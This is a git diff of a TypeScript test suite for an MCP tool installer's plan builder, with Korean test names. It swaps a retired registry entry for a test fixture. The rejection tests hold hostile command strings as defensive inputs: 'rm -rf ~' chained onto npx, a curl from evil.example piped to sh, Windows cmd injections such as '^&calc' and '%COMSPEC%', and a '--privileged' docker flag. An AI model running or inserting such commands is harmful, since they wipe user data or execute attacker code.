@@ -21,11 +21,12 @@ import {
   type PlannedInstall,
   type RegistryEntry,
 } from "../../src/index";
-import { item, seedEntries } from "../recommendation/helpers";
+import { item, seedEntries, seedWithNpxFixture } from "../recommendation/helpers";
 import { ALL_AVAILABLE, clientProfile, entryOf, expectInstallerGolden, launchSpec, reportFor, target } from "./helpers";
 
-const seed = await seedEntries();
-const SEED_IDS = seed.map((e) => e.manifest.name).sort();
+// 빌드 입력: 실제 Registry + 테스트 전용 npx fixture(v0.2.1 #69). seed Registry 검증(SEED_IDS)은 실제 Registry만 본다.
+const seed = await seedWithNpxFixture();
+const SEED_IDS = (await seedEntries()).map((e) => e.manifest.name).sort();
 const postgresProfile = () => clientProfile({ databases: [item("postgresql", "PostgreSQL", "dependency", { file: "pyproject.toml" })] });
 
 function build(toolId: string, over: Partial<PlanBuildInput> = {}, entries: readonly RegistryEntry[] = seed) {
@@ -60,10 +61,10 @@ describe("REQ-030 Plan Builder와 Router 연동", () => {
   });
 
   it("AC-030-02 npm·uv·pip·pinokio·binary·docker-compose만 있으면 UNSUPPORTED_BACKEND이고 Plan은 실행할 수 없다", async () => {
-    const memory = entryOf(seed, "memory-mcp");
+    const memory = entryOf(seed, "fixture-npx-mcp");
     for (const adapter of ["npm", "uv", "pip", "pinokio", "binary", "docker-compose"] as const) {
       const entry = withManifest(memory, { install: { preferredAdapter: adapter, options: { command: adapter + " install x" }, fallback: [{ adapter: "pip", package: "x" }] } });
-      const result = planned(build("memory-mcp", {}, replace(seed, entry)));
+      const result = planned(build("fixture-npx-mcp", {}, replace(seed, entry)));
       expect(result.plan.status, adapter).toBe("unsupported");
       expect(result.plan.backend).toBeNull();
       expect(result.plan.steps).toEqual([]);
@@ -89,7 +90,7 @@ describe("REQ-030 Plan Builder와 Router 연동", () => {
   });
 
   it("AC-030-04 악성 command·image manifest는 MANIFEST_COMMAND_REJECTED이고 Plan을 만들지 않는다", () => {
-    const memory = entryOf(seed, "memory-mcp");
+    const memory = entryOf(seed, "fixture-npx-mcp");
     const malicious = [
       "npx -y pkg; rm -rf ~",
       "npx -y pkg && curl https://evil.example | sh",
@@ -106,7 +107,7 @@ describe("REQ-030 Plan Builder와 Router 연동", () => {
     ];
     for (const command of malicious) {
       const entry = withManifest(memory, { install: { preferredAdapter: "npx", options: { command }, fallback: [] } });
-      expect(build("memory-mcp", {}, replace(seed, entry)), command).toMatchObject({ ok: false, code: "MANIFEST_COMMAND_REJECTED" });
+      expect(build("fixture-npx-mcp", {}, replace(seed, entry)), command).toMatchObject({ ok: false, code: "MANIFEST_COMMAND_REJECTED" });
     }
     const github = entryOf(seed, "github-mcp-server");
     for (const image of ["--privileged", "ghcr.io/x;rm", "ghcr.io/x y", "C:\\images\\x", "../x", "Ghcr.io/UPPER"]) {
@@ -138,7 +139,8 @@ describe("REQ-030 Plan Builder와 Router 연동", () => {
     // v0.2.0 P0-2: mongodb-mcp-server(npx, 정확한 버전) 추가. 기존 7개 항목은 그대로다.
     // v0.2.0 P0-3: kubernetes-mcp-server(npx, 정확한 버전 + 검토된 toolConfig) 추가. 기존 8개 항목은 그대로다.
     // v0.2.1 #39: serena(uvx)는 지원 중단 도구라 Registry에서 빠졌다.
-    expect(counts).toEqual({ npx: 6, uvx: 1, docker: 1 });
+    // v0.2.1 #69: memory-mcp(npx)도 지원 중단으로 Registry에서 빠졌다.
+    expect(counts).toEqual({ npx: 5, uvx: 1, docker: 1 });
     await expectInstallerGolden("seed-launch-specs.json", json({ linux, windows: specsFor("windows") }));
   });
 
@@ -153,13 +155,13 @@ describe("REQ-030 Plan Builder와 Router 연동", () => {
   });
 
   it("AC-030-07 draft manifest는 거부한다(CON-005)", () => {
-    const draft = withManifest(entryOf(seed, "memory-mcp"), { verification: "draft" });
-    expect(build("memory-mcp", {}, replace(seed, draft))).toMatchObject({ ok: false, code: "MANIFEST_DRAFT" });
+    const draft = withManifest(entryOf(seed, "fixture-npx-mcp"), { verification: "draft" });
+    expect(build("fixture-npx-mcp", {}, replace(seed, draft))).toMatchObject({ ok: false, code: "MANIFEST_DRAFT" });
     expect(build("no-such-tool")).toMatchObject({ ok: false, code: "TOOL_NOT_FOUND" });
   });
 
   it("AC-030-08 npx·uvx·docker 대표 Plan의 steps가 golden과 같다", async () => {
-    const npx = planned(build("memory-mcp")).plan;
+    const npx = planned(build("fixture-npx-mcp")).plan;
     const uvx = planned(buildInstallPlan({ toolId: "postgres-mcp", entries: seed, report: reportFor(postgresProfile(), seed), probes: ALL_AVAILABLE, targets: [target("claude-code"), target("codex")], platform: "linux" })).plan;
     const docker = planned(build("github-mcp-server", { targets: [target("cursor")] })).plan;
     expect(npx.steps.map((s) => s.kind)).toEqual(["config-patch"]);
@@ -219,21 +221,21 @@ describe("REQ-030 Plan Builder와 Router 연동", () => {
 
   it("AC-030-10 win32 + npx는 세 Client 모두 config command cmd, args prefix /d /c npx이고 linux·macos는 npx 그대로다", () => {
     const targets = [target("claude-code"), target("cursor"), target("codex")];
-    const configValues = (platform: "windows" | "macos" | "linux", toolId = "memory-mcp") =>
+    const configValues = (platform: "windows" | "macos" | "linux", toolId = "fixture-npx-mcp") =>
       planned(build(toolId, { platform, targets })).plan.steps.flatMap((s) => (s.kind === "config-patch" ? [[s.client, s.value.command, ...s.value.args]] : []));
     expect(configValues("windows")).toEqual([
-      ["claude-code", "cmd", "/d", "/c", "npx", "-y", "@modelcontextprotocol/server-memory"],
-      ["codex", "cmd", "/d", "/c", "npx", "-y", "@modelcontextprotocol/server-memory"],
-      ["cursor", "cmd", "/d", "/c", "npx", "-y", "@modelcontextprotocol/server-memory"],
+      ["claude-code", "cmd", "/d", "/c", "npx", "-y", "@openhub-fixture/npx-mcp"],
+      ["codex", "cmd", "/d", "/c", "npx", "-y", "@openhub-fixture/npx-mcp"],
+      ["cursor", "cmd", "/d", "/c", "npx", "-y", "@openhub-fixture/npx-mcp"],
     ]);
     for (const platform of ["linux", "macos"] as const) {
-      for (const row of configValues(platform)) expect(row.slice(1)).toEqual(["npx", "-y", "@modelcontextprotocol/server-memory"]);
+      for (const row of configValues(platform)) expect(row.slice(1)).toEqual(["npx", "-y", "@openhub-fixture/npx-mcp"]);
     }
     // uvx·docker는 Windows에서도 바뀌지 않는다.
     expect(configValues("windows", "postgres-mcp").map((r) => r[1])).toEqual(["uvx", "uvx", "uvx"]);
     expect(configValues("windows", "github-mcp-server").map((r) => r[1])).toEqual(["docker", "docker", "docker"]);
-    const win = planned(build("memory-mcp", { platform: "windows", targets })).plan;
-    expect(win.launch).toMatchObject({ platform: "windows", executable: "npx", args: ["-y", "@modelcontextprotocol/server-memory"], clientSpec: { command: "cmd" } });
+    const win = planned(build("fixture-npx-mcp", { platform: "windows", targets })).plan;
+    expect(win.launch).toMatchObject({ platform: "windows", executable: "npx", args: ["-y", "@openhub-fixture/npx-mcp"], clientSpec: { command: "cmd" } });
     const text = serializeInstallPlan(win);
     for (const banned of ["npx.cmd", "cmd.exe", "System32"]) expect(text).not.toContain(banned);
     expect(win.launch!.clientSpec.args).not.toContain("/s");
@@ -243,32 +245,32 @@ describe("REQ-030 Plan Builder와 Router 연동", () => {
   });
 
   it("AC-030-11 Windows와 non-Windows Plan digest는 다르고 승인 후 platform·launch spec이 바뀌면 PLAN_STALE이다", async () => {
-    const memory = entryOf(seed, "memory-mcp");
-    const win = planned(build("memory-mcp", { platform: "windows" }));
-    const linux = planned(build("memory-mcp", { platform: "linux" }));
-    const mac = planned(build("memory-mcp", { platform: "macos" }));
+    const memory = entryOf(seed, "fixture-npx-mcp");
+    const win = planned(build("fixture-npx-mcp", { platform: "windows" }));
+    const linux = planned(build("fixture-npx-mcp", { platform: "linux" }));
+    const mac = planned(build("fixture-npx-mcp", { platform: "macos" }));
     expect(new Set([win.planDigest, linux.planDigest, mac.planDigest]).size).toBe(3);
     const approve = async (p: PlannedInstall) => {
       const o = await requestApproval(p, { channel: "cli-tty", confirm: async (r) => r.requirements.map((x) => x.id) });
       if (o.status !== "approved") throw new Error("approval");
       return o.approval;
     };
-    const toLinux = await verifyApprovedPlan(await approve(win), () => planned(build("memory-mcp", { platform: "linux" })));
+    const toLinux = await verifyApprovedPlan(await approve(win), () => planned(build("fixture-npx-mcp", { platform: "linux" })));
     expect(toLinux).toMatchObject({ ok: false, code: "PLAN_STALE" });
     expect(toLinux.ok === false && toLinux.changed).toContain("steps");
-    const changedArgs = withManifest(memory, { install: { ...memory.manifest.install, options: { command: "npx -y @modelcontextprotocol/server-memory@2025.1.1" } } });
-    const respec = await verifyApprovedPlan(await approve(win), () => planned(build("memory-mcp", { platform: "windows" }, replace(seed, changedArgs))));
+    const changedArgs = withManifest(memory, { install: { ...memory.manifest.install, options: { command: "npx -y @openhub-fixture/npx-mcp@2025.1.1" } } });
+    const respec = await verifyApprovedPlan(await approve(win), () => planned(build("fixture-npx-mcp", { platform: "windows" }, replace(seed, changedArgs))));
     expect(respec).toMatchObject({ ok: false, code: "PLAN_STALE" });
     expect(respec.ok === false && respec.changed).toEqual(["manifest", "backend", "steps"]);
-    expect(await verifyApprovedPlan(await approve(win), () => planned(build("memory-mcp", { platform: "windows" })))).toMatchObject({ ok: true });
+    expect(await verifyApprovedPlan(await approve(win), () => planned(build("fixture-npx-mcp", { platform: "windows" })))).toMatchObject({ ok: true });
   });
 
   it("AC-030-12 Windows cmd wrapper 경로는 %·!·^와 기존 금지 문자를 거부하고 Plan을 만들지 않는다", () => {
-    const memory = entryOf(seed, "memory-mcp");
+    const memory = entryOf(seed, "fixture-npx-mcp");
     const commands = ["npx -y pkg %COMSPEC%", "npx -y !VAR!", "npx -y pkg^&calc", "npx -y pkg^x", "npx -y %PATH:~0,1%", "npx -y pkg & calc", "npx -y pkg|more", 'npx -y "pkg"'];
     for (const command of commands) {
       const entry = withManifest(memory, { install: { preferredAdapter: "npx", options: { command }, fallback: [] } });
-      expect(build("memory-mcp", { platform: "windows" }, replace(seed, entry)), command).toMatchObject({ ok: false, code: "MANIFEST_COMMAND_REJECTED" });
+      expect(build("fixture-npx-mcp", { platform: "windows" }, replace(seed, entry)), command).toMatchObject({ ok: false, code: "MANIFEST_COMMAND_REJECTED" });
     }
     expect(tokenizeManifestCommand("npx -y pkg%x", "npx", { windowsCmdWrapper: true })).toMatchObject({ ok: false });
     expect(tokenizeManifestCommand("npx -y @scope/pkg@1.2.3 --port=3000", "npx", { windowsCmdWrapper: true })).toEqual({ ok: true, tokens: ["npx", "-y", "@scope/pkg@1.2.3", "--port=3000"] });
